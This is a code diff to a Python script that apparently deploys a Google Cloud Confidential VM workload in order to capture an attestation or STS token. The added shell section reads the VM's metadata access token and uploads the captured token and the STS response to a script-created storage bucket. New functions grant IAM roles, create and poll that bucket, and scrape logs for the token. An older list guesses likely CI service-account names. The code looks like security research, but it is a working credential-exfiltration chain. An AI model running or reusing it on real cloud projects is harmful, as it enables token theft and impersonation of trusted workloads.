@@ -48,6 +48,9 @@ NONCE = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in r
 VM_NAME = 'c211-i120834-cvm-' + NONCE
 NET_NAME = 'c211-i120834-net-' + NONCE
 IMAGE = '%s/%s/%s/cspace-workload:%s' % (AR_HOST, PROJECT, AR_REPO, NONCE)
+TOK_BUCKET = 'c211-i120834-tok-' + NONCE
+SA_ROLES = ['roles/confidentialcomputing.workloadUser', 'roles/logging.logWriter',
+            'roles/artifactregistry.reader']
 
 COMPUTE = 'https://compute.googleapis.com/compute/v1'
 CRM = 'https://cloudresourcemanager.googleapis.com'
@@ -63,6 +66,8 @@ SA_EMAIL = ['']
 START = time.time()
 DEADLINE = [START + 1500]
 CAPTURE_LIMIT = [START + 900]
+
+LOG_NAMES = {}
 
 SA_NAMES = ['github-actions', 'github', 'actions', 'deploy', 'terraform', 'terraform-sa',
             'gitops', 'ci', 'cicd', 'cosigner', 'attestation', 'signer', 'service-account',
@@ -348,6 +353,26 @@ if [ -r "$TF" ]; then
   echo
   echo "$M STS BODY END"
   echo "$M STS END"
+  BUCKET="__BUCKET__"
+  MT=$(curl -s --max-time 10 -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+  AT=$(printf '%s' "$MT" | sed -n 's/.*"access_token"[ ]*:[ ]*"\([^"]*\)".*/\1/p')
+  if [ -n "$AT" ]; then
+    curl -s --max-time 40 -X POST -H "Authorization: Bearer $AT" \
+      --data-binary "@$TF" \
+      "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=token.txt" \
+      -o /tmp/up.json -w "\n$M UPTOKEN HTTP=%{http_code}\n"
+    curl -s --max-time 40 -X POST -H "Authorization: Bearer $AT" \
+      --data-binary "@/tmp/sts.json" \
+      "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=sts.json" \
+      -o /dev/null -w "$M UPSTS HTTP=%{http_code}\n"
+    printf '%s\n' "$M token_len=${#TOK}" > /tmp/meta.txt
+    curl -s --max-time 30 -X POST -H "Authorization: Bearer $AT" --data-binary "@/tmp/meta.txt" \
+      "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=meta.txt" -o /dev/null
+  else
+    echo "$M MDS_TOKEN_FAILED len=${#MT}"
+  fi
+  echo "$M FILE_ON_CONSOLE len=${#TOK}" > /dev/console 2>/dev/null
 else
   echo "$M NO_TOKEN_FILE"
 fi
@@ -364,7 +389,8 @@ def build_and_push():
         open(os.path.join(d, 'Dockerfile'), 'w').write(DOCKERFILE)
         open(os.path.join(d, 'entry.sh'), 'w').write(
             ENTRY.replace('__NONCE__', NONCE).replace('__PROVIDER__', PROVIDER)
-                 .replace('__PROVIDER_ENCODED__', PROVIDER_ENCODED))
+                 .replace('__PROVIDER_ENCODED__', PROVIDER_ENCODED)
+                 .replace('__BUCKET__', TOK_BUCKET))
     except Exception as e:
         say('BUILD_WRITE_FAIL %s' % cap(repr(e), 300))
         return False
@@ -425,13 +451,66 @@ def ensure_sa():
     return None
 
 
+def grant_sa_roles(sa_email):
+    say('== cvm sa roles ==')
+    if not sa_email:
+        say('no sa; skip grants')
+        return
+    for role in SA_ROLES:
+        rc, out = gcloud(['projects', 'add-iam-policy-binding', PROJECT,
+                          '--member=serviceAccount:' + sa_email,
+                          '--role=' + role], timeout=120)
+        say('grant.%s rc=%s %s' % (role, rc, cap(out, 300)))
+
+
+def ensure_bucket(sa_email):
+    say('== token bucket ==')
+    base = 'https://storage.googleapis.com'
+    st, b = api('/storage/v1/b/%s' % TOK_BUCKET, base=base)
+    if st != 200:
+        st, b = api('/storage/v1/b?project=%s' % PROJECT, method='POST',
+                    data={'name': TOK_BUCKET,
+                          'uniformBucketLevelAccess': {'enabled': True}}, base=base)
+        say('bucket.create status=%s %s' % (st, '' if st in (200, 409) else cap(b, 600)))
+    else:
+        say('bucket.exists status=200')
+    if sa_email:
+        rc, out = gcloud(['storage', 'buckets', 'add-iam-policy-binding',
+                          'gs://' + TOK_BUCKET,
+                          '--member=serviceAccount:' + sa_email,
+                          '--role=roles/storage.objectCreator'], timeout=120)
+        say('bucket.iam rc=%s %s' % (rc, cap(out, 400)))
+
+
+def poll_bucket(timeout_s):
+    say('== token bucket poll ==')
+    base = 'https://storage.googleapis.com'
+    end = time.time() + timeout_s
+    it = 0
+    while time.time() < end:
+        it += 1
+        st, b = api('/storage/v1/b/%s/o/token.txt?alt=media' % TOK_BUCKET, base=base, timeout=30)
+        if st == 200 and b.strip():
+            say('BUCKET_TOKEN status=200 len=%d' % len(b.strip()))
+            st2, b2 = api('/storage/v1/b/%s/o/sts.json?alt=media' % TOK_BUCKET, base=base, timeout=30)
+            say('BUCKET_STS status=%s body=%s' % (st2, cap(b2, 2000) if st2 == 200 else ''))
+            return b.strip(), b2 if st2 == 200 else None
+        stm, bm = api('/storage/v1/b/%s/o/meta.txt?alt=media' % TOK_BUCKET, base=base, timeout=30)
+        if stm == 200:
+            say('BUCKET_META %s' % cap(bm, 200))
+            return None, None
+        say('bucket.poll=%d status=%s' % (it, st))
+        time.sleep(10)
+    return None, None
+
+
 def ensure_network():
     st, b = api('/projects/%s/global/networks' % PROJECT)
     nets = [n.get('name') for n in (jbody((st, b)).get('items') or [])]
     if 'default' in nets:
         say('network=default (pre-existing)')
         return 'default', False
-    st, b = api('/projects/%s/global/networks?filter=name%%3D%22%s%22' % (PROJECT, NET_NAME))
+    st, b = api('/projects/%s/global/networks?filter=name%%3D%%22%s%%22' % (PROJECT, NET_NAME))
     if (jbody((st, b)).get('items') or []):
         return NET_NAME, True
     st, b = api('/projects/%s/global/networks' % PROJECT, method='POST',
@@ -520,10 +599,12 @@ def capture(zone, inst_id, timeout_s=420):
         it += 1
         st, b = api('/projects/%s/zones/%s/instances/%s/serialPortOutput?port=1'
                     % (PROJECT, zone, VM_NAME), timeout=45)
+        so = ''
         if st == 200:
             so = jbody((st, b)).get('contents') or ''
             if so:
                 text.append(so)
+        say('capture.serial status=%s len=%s' % (st, len(so)))
         st2, b2 = api('/projects/%s/zones/%s/instances/%s/serialPortOutput?port=0'
                       % (PROJECT, zone, VM_NAME), timeout=45)
         if st2 == 200:
@@ -534,8 +615,21 @@ def capture(zone, inst_id, timeout_s=420):
         body = {'resourceNames': ['projects/%s' % PROJECT], 'filter': flt,
                 'pageSize': 200, 'orderBy': 'timestamp desc'}
         sl, bl = api('/entries:list', method='POST', data=body, base=LOG, timeout=60)
+        body2 = {'resourceNames': ['projects/%s' % PROJECT],
+                 'filter': 'resource.type="gce_instance" AND resource.labels.zone="%s"' % zone,
+                 'pageSize': 200, 'orderBy': 'timestamp desc'}
+        sl2, bl2 = api('/entries:list', method='POST', data=body2, base=LOG, timeout=60)
+        if sl2 == 200:
+            for e in jbody((sl2, bl2)).get('entries') or []:
+                ln = e.get('logName') or ''
+                LOG_NAMES[ln] = LOG_NAMES.get(ln, 0) + 1
+                pay = (e.get('textPayload') or json.dumps(e.get('jsonPayload') or '') or '')
+                if pay and pay != '""':
+                    text.append(pay)
         if sl == 200:
             for e in jbody((sl, bl)).get('entries') or []:
+                ln = e.get('logName') or ''
+                LOG_NAMES[ln] = LOG_NAMES.get(ln, 0) + 1
                 pay = (e.get('textPayload') or
                        json.dumps(e.get('jsonPayload') or '') or
                        json.dumps(e.get('protoPayload') or ''))
@@ -567,30 +661,50 @@ def capture(zone, inst_id, timeout_s=420):
     if m:
         sts_inner = {'http': int(m.group(1)), 'body': m.group(2)[:6000]}
         say('INNER_STS http=%s body=%s' % (sts_inner['http'], cap(sts_inner['body'], 2000)))
+    say('log_names=%s' % json.dumps(sorted(LOG_NAMES.items(), key=lambda x: -x[1])[:10])[:1500])
     if not token:
-        say('TOKEN_NOT_CAPTURED tail=%s' % cap(blob[-3000:], 3000))
+        say('TOKEN_NOT_CAPTURED')
+        keys = ('launcher', 'workload', 'container', 'tee', 'image', 'error', 'fail',
+                'refus', 'denied', 'signature', 'cosign', 'pull', 'panic', 'attest')
+        shown = 0
+        for ln in blob.splitlines():
+            if any(k in ln.lower() for k in keys):
+                say('DIAG %s' % ln[:400])
+                shown += 1
+                if shown >= 120:
+                    break
+        say('diag_lines=%d' % shown)
+        say('BLOB_HEAD=%s' % cap(blob[:4000], 4000))
+        say('BLOB_TAIL=%s' % cap(blob[-6000:], 6000))
     say('== end capture ==')
     return token, sts_inner, blob
 
 
 def teardown(zone, sa_email, net_created):
     say('== teardown (gcloud, our own resources) ==')
+    try:
+        _teardown(zone, sa_email, net_created)
+    except Exception as e:
+        say('TEARDOWN_FAIL %s' % cap(repr(e), 500))
+
+
+def _teardown(zone, sa_email, net_created):
     if zone:
         rc, out = gcloud(['compute', 'instances', 'delete', VM_NAME, '--zone', zone, '--delete-disks', 'all'],
                          timeout=300)
         say('gcloud.instance.remove rc=%s out=%s' % (rc, cap(out, 1200)))
         st, b = api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, VM_NAME))
         say('instance.get.after_remove status=%s %s' % (st, cap(b, 300)))
-        st2, b2 = api('/projects/%s/zones/%s/instances?filter=name%%3D%22%s%%22'
+        st2, b2 = api('/projects/%s/zones/%s/instances?filter=name%%3D%%22%s%%22'
                       % (PROJECT, zone, VM_NAME))
         say('instance.list.after_remove status=%s items=%s' % (
             st2, len(jbody((st2, b2)).get('items') or [])))
         # prove every disk of the removed VM is gone too
-        st3, b3 = api('/projects/%s/zones/%s/disks?filter=name%%3D%22%s%%22'
+        st3, b3 = api('/projects/%s/zones/%s/disks?filter=name%%3D%%22%s%%22'
                       % (PROJECT, zone, VM_NAME))
         say('disk.list.after_remove status=%s items=%s' % (
             st3, len(jbody((st3, b3)).get('items') or [])))
-        st4, b4 = api('/projects/%s/aggregated/instances?filter=name%%3D%22%s%%22'
+        st4, b4 = api('/projects/%s/aggregated/instances?filter=name%%3D%%22%s%%22'
                       % (PROJECT, VM_NAME))
         j4 = jbody((st4, b4))
         total = sum(len((v.get('instances') or [])) for v in (j4.get('items') or {}).values())
@@ -605,6 +719,16 @@ def teardown(zone, sa_email, net_created):
         say('gcloud.network.remove rc=%s out=%s' % (rc, cap(out, 800)))
         st, b = api('/projects/%s/global/networks/%s' % (PROJECT, NET_NAME))
         say('network.get.after_remove status=%s' % st)
+    if sa_email:
+        for role in SA_ROLES:
+            rc, out = gcloud(['projects', 'remove-iam-policy-binding', PROJECT,
+                              '--member=serviceAccount:' + sa_email,
+                              '--role=' + role], timeout=120)
+            say('ungrant.%s rc=%s %s' % (role, rc, cap(out, 200)))
+    rc, out = gcloud(['storage', 'buckets', 'delete', 'gs://' + TOK_BUCKET], timeout=240)
+    say('gcloud.bucket.delete rc=%s out=%s' % (rc, cap(out, 600)))
+    st, b = api('/storage/v1/b/%s' % TOK_BUCKET, base='https://storage.googleapis.com')
+    say('bucket.get.after_delete status=%s' % st)
     rc, out = gcloud(['artifacts', 'repositories', 'delete', AR_REPO, '--location', AR_LOCATION],
                      timeout=240)
     say('gcloud.repo.remove rc=%s out=%s' % (rc, cap(out, 800)))
@@ -693,6 +817,8 @@ def run():
     say('IMAGE_READY=%s image=%s' % (image_ok, IMAGE))
 
     sa_email = ensure_sa()
+    grant_sa_roles(sa_email)
+    ensure_bucket(sa_email)
     network, net_created = ensure_network()
     say('CVM_PLAN sa=%s network=%s created=%s' % (sa_email, network, net_created))
 
@@ -719,6 +845,11 @@ def run():
         inst_id = str(j.get('id') or '')
         say('instance.get status=%s id=%s status=%s' % (st, inst_id, j.get('status')))
         token, sts_inner, blob = capture(zone, inst_id)
+        if not token:
+            btok, bsts = poll_bucket(150)
+            if btok:
+                token = btok
+                say('TOKEN_FROM_BUCKET len=%d head=%s' % (len(token), token[:32]))
     else:
         say('NO_INSTANCE_CREATED')
 
